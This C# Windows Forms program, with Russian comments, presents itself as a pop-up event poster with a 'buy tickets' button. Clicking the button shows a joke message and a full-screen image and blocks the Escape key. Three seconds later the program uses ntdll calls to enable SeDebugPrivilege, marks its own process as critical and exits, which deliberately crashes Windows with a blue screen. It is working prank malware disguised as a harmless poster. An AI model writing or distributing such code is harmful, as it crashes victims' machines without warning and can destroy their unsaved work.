using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class PosterForm : Form
{
    Image posterImg;
    Image daddyImg;
    bool isDaddyMode = false;
    System.Windows.Forms.Timer bsodTimer; // Таймер для задержки перед BSoD

    // Импорт функций ntdll.dll для перевода процесса в критический статус
    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int privilege, bool bEnablePrivilege, bool bCurrentThread, out bool prevValue);

    [DllImport("ntdll.dll")]
    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

    public PosterForm()
    {
        // Загрузка ресурсов
        using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("poster.jpg"))
            posterImg = Image.FromStream(s);

        using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("daddy.png"))
            daddyImg = Image.FromStream(s);

        FormBorderStyle = FormBorderStyle.None;
        TopMost = true;
        ShowInTaskbar = false;
        StartPosition = FormStartPosition.Manual;
        KeyPreview = true;
        DoubleBuffered = true;
        Cursor = Cursors.Hand;

        // Инициализация таймера
        bsodTimer = new System.Windows.Forms.Timer();
        bsodTimer.Interval = 3000; // Задержка в миллисекундах (3 секунды)
        bsodTimer.Tick += BsodTimer_Tick;

        SetupPosterLayout();
    }

    private void SetupPosterLayout()
    {
        isDaddyMode = false;
        Rectangle area = Screen.PrimaryScreen.WorkingArea;
        int h = (int)(area.Height * 0.75);
        int w = h * posterImg.Width / posterImg.Height;
        ClientSize = new Size(w, h);
        Location = new Point(area.Right - w - 20, area.Top + (area.Height - h) / 2);
    }

    private void SetupFullScreenDaddyLayout()
    {
        isDaddyMode = true;
        Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
        Location = new Point(screenBounds.Left, screenBounds.Top);
        ClientSize = new Size(screenBounds.Width, screenBounds.Height);
    }

    protected override void OnPaint(PaintEventArgs e)
    {
        e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

        if (isDaddyMode)
        {
            e.Graphics.DrawImage(daddyImg, 0, 0, ClientSize.Width, ClientSize.Height);
        }
        else
        {
            e.Graphics.DrawImage(posterImg, 0, 0, ClientSize.Width, ClientSize.Height);
        }
    }

    protected override void OnMouseClick(MouseEventArgs e)
    {
        if (isDaddyMode) return; // Игнорируем клики, если таймер смерти уже запущен

        double fx = (double)e.X / ClientSize.Width;
        double fy = (double)e.Y / ClientSize.Height;

        // Кнопка закрытия (крестик)
        if (fx > 0.93 && fy < 0.07)
        {
            Close();
            return;
        }

        // Кнопка КУПИТЬ БИЛЕТЫ
        if (fx > 0.17 && fx < 0.83 && fy > 0.92 && fy < 0.995)
        {
            MessageBox.Show("Билеты закончились! Все раскупил Медведь 🐻 , Деревня Петухи", 
                            "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);

            // 1. Переключаемся на полный экран с daddy.png
            SetupFullScreenDaddyLayout();
            Invalidate(); // Принудительно перерисовываем интерфейс, чтобы картинка появилась

            // 2. Запускаем таймер обратного отсчета до синего экрана
            bsodTimer.Start();
        }

        base.OnMouseClick(e);
    }

    private void BsodTimer_Tick(object sender, EventArgs e)
    {
        bsodTimer.Stop(); // Останавливаем таймер во избежание повторного вызова
        TriggerBsod();
    }

    private void TriggerBsod()
    {
        try
        {
            // Получаем SeDebugPrivilege (идентификатор: 20)
            RtlAdjustPrivilege(20, true, false, out _);

            // Устанавливаем статус BreakOnTermination (класс: 29)
            int isCritical = 1;
            IntPtr currentProcessHandle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(currentProcessHandle, 29, ref isCritical, sizeof(int));

            // Завершаем процесс. Так как он критический — Windows немедленно падает в BSoD CRITICAL_PROCESS_DIED
            Environment.Exit(0);
        }
        catch
        {
            // Если что-то пошло не так (например, запуск не от Администратора), просто закрываем приложение
            Environment.Exit(1);
        }
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
        // Блокируем выход по Escape, если приложение перешло в режим Daddy (система уже приговорена)
        if (e.KeyCode == Keys.Escape && !isDaddyMode)
        {
            Close();
        }
        base.OnKeyDown(e);
    }

    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new PosterForm());
    }
}
